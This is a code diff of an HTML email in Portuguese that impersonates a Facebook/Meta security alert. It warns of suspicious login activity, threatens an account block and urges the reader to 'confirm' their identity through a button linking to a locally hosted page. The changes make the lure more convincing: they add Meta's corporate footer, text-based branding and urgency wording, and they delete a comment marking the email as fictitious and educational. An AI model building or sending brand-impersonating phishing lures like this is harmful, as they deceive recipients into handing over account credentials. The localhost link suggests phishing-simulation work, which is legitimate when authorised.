@@ -2,28 +2,112 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>Facebook - Confirmação de Conta</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Alerta de Segurança</title>
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; }
-        .container { max-width: 600px; margin: 50px auto; background: #fff; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); padding: 30px; }
-        .logo { text-align: center; margin-bottom: 20px; }
-        .logo img { width: 120px; }
-        h2 { color: #1877f2; }
-        .button { display: inline-block; padding: 12px 25px; background-color: #1877f2; color: white; border-radius: 5px; text-decoration: none; margin-top: 20px; }
-        p { color: #333; }
+        body { 
+            font-family: Arial, sans-serif; 
+            background-color: #f0f2f5; 
+            margin: 0; 
+            padding: 0; 
+            line-height: 1.5; 
+            color: #333; /* Cor de texto padrão */
+        }
+        .container { 
+            max-width: 600px; 
+            margin: 50px auto; 
+            background: #fff; 
+            border-radius: 8px; 
+            box-shadow: 0 0 10px rgba(0,0,0,0.1); 
+            padding: 30px; 
+            text-align: left; /* Alinhamento do texto principal */
+        }
+        .header { 
+            text-align: center; 
+            margin-bottom: 25px; 
+        }
+        /* Estilo para o logo Facebook em texto (para não usar imagem) */
+        .facebook-logo-text {
+            font-size: 24px; /* Tamanho da fonte do logo */
+            font-weight: bold;
+            color: #1877f2; /* Azul do Facebook */
+            text-decoration: none;
+            display: block;
+            margin-bottom: 5px; /* Espaço abaixo do logo */
+        }
+        .facebook-logo-tagline {
+            font-size: 13px;
+            color: #606770;
+            display: block;
+        }
+        h2 { 
+            color: #1877f2; /* Azul do Facebook para o título */
+            font-size: 18px; 
+            margin-top: 20px; 
+            margin-bottom: 15px; 
+            text-align: center; /* Centraliza o título */
+        }
+        .body-text { 
+            font-size: 16px; 
+            color: #333; 
+            margin-bottom: 15px; 
+        }
+        .body-text strong {
+            font-weight: bold; /* Deixa o texto em negrito mais visível */
+        }
+        .button-area {
+            text-align: center; /* Centraliza o botão */
+            margin-top: 25px;
+            margin-bottom: 30px;
+        }
+        .button { 
+            display: inline-block; 
+            padding: 12px 25px; 
+            background-color: #1877f2; /* Azul do Facebook */
+            color: white !important; /* Cor do texto do botão (branco) */
+            border-radius: 5px; 
+            text-decoration: none; /* Remove sublinhado do link */
+            font-weight: bold;
+            font-size: 15px;
+            line-height: 1; /* Alinhamento vertical do texto no botão */
+        }
+        .footer { 
+            border-top: 1px solid #e0e0e0; 
+            padding-top: 20px; 
+            margin-top: 20px; 
+            font-size: 11px; 
+            color: #606770; /* Cor de texto do rodapé */
+            text-align: center; 
+        }
+        .footer a { 
+            color: #1877f2; 
+            text-decoration: none; 
+        }
     </style>
 </head>
 <body>
-    <!-- ESTE E-MAIL É FICTÍCIO E EDUCACIONAL -->
     <div class="container">
-        <div class="logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+        <div class="header">
+            <span class="facebook-logo-text">facebook</span>
+            <span class="facebook-logo-tagline">Ajuda a manter a sua conta segura.</span>
         </div>
+        
         <h2>Atenção: atividade suspeita detectada</h2>
-        <p>Detectamos uma tentativa de acesso suspeita à sua conta do Facebook. Por segurança, sua conta será temporariamente bloqueada.</p>
-        <p>Evite o bloqueio confirmando sua identidade:</p>
-        <a href="http://localhost:8000/facebook/index.html" class="button">Confirmar minha conta</a>
-        <p style="margin-top: 30px; font-size: 12px; color: gray;">© 2025 Facebook Inc.</p>
+        
+        <p class="body-text">Olá!</p>
+        <p class="body-text">Detectamos uma tentativa de acesso suspeita à sua conta do Facebook em um dispositivo desconhecido.</p>
+        <p class="body-text">Por segurança, sua conta será temporariamente bloqueada.</p>
+        <p class="body-text">Evite o bloqueio confirmando sua identidade <strong>o mais rápido possível</strong>:</p>
+
+        <div class="button-area">
+            <a href="http://localhost:8000/facebook/index.html" class="button">Confirmar minha conta</a>
+        </div>
+        
+        <div class="footer">
+            <p>Este e-mail foi enviado para você por Facebook, Meta Platforms, Inc., 1 Hacker Way, Menlo Park, CA 94025.</p>
+            <p>&copy; 2025 Meta Platforms, Inc. Todos os direitos reservados.</p>
+            <p><a href="#" class="footer-link">Verifique as configurações de segurança</a> | <a href="#" class="footer-link">Política de Dados</a></p>
+        </div>
     </div>
 </body>
 </html>
